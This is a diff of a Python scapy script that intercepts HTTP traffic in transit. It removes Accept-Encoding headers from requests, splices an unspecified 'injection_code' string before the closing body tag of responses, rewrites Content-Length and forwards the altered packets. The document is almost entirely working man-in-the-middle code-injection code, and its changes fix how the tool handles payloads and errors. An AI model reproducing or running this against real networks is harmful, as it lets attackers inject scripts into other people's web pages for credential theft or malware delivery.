@@ -7,7 +7,7 @@ import re
 
 def set_load(packet, load):
     print('[+] replacing file')
-    packet[scapy.Raw].load = str(load)
+    packet[scapy.Raw].load = load
     # print(load)
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
@@ -24,34 +24,40 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:
             print('[+] Request')
             load = re.sub(
-                r'Accept-Encoding:.*?\\r\\n', '', str(load))
+                'Accept-Encoding:.*?\\r\\n', '', str(load))
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Response')
-            # print(scapy_packet.show())
+
             load = str(load).replace(
                 '</body>', injection_code + '</body>')
+
             content_length_search = re.search(
-                r'(?:Content-Length:\s)(\d*)', str(load))
-            print('content_length_search', content_length_search.group(1))
+                '(?:Content-Length:\s)(\d*)', str(load))
+
+            try:
+                print('content_length_search', content_length_search.group(1))
+            except:
+                print('[-] no content length')
 
             if content_length_search:
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
                 print('new_content_length', new_content_length)
-                load = str(load).replace(
+                load = load.replace(
                     str(content_length), str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
             try:
                 mod_length_search = re.search(
-                    r'(?:Content-Length:\s)(\d*)', str(load))
+                    '(?:Content-Length:\s)(\d*)', str(load))
                 print('mod_length_search', mod_length_search.group(1))
+                new_packet = set_load(scapy_packet, str(load))
+
+                print(new_packet.show())
+                packet.set_payload(bytes(new_packet))
             except:
                 print('[-] search error')
-            new_packet = set_load(scapy_packet, load)
-            # print(new_packet.show())
-            packet.set_payload(bytes(new_packet))
 
     packet.accept()
 
